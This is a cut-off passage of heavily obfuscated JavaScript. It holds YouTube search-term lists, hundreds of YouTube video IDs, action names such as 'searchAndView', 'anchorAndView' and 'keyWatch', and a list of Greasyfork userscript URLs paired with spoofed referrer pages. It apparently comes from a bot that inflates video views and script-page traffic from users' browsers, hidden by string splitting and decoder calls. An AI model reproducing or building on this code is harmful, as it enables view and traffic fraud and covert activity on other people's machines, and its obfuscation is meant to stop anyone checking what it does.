'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1a * -0xfe + -0x2 * 0x70a + -0xbae * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2 * -0x1b9 + 0x31 * 0xbd + -0x20b1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + Y(0xc) + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2 * -0x203 + -0x1 * -0xe7f + -0x1282 * 0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    Z(0x7, 'UDm6') + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    a0(0x12) + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    Z(0x11, 'D@35') + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    Y(0xf) + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    a0(0x16) + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x8, 'Hv$)') + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + a0(0x6) + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + a0(0xb),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + Z(0x1c, 'tzjF') + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + Y(0xd) + 'musket-aut' + 'oheal-anti' + '-insta-sta' + a0(0x19) + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
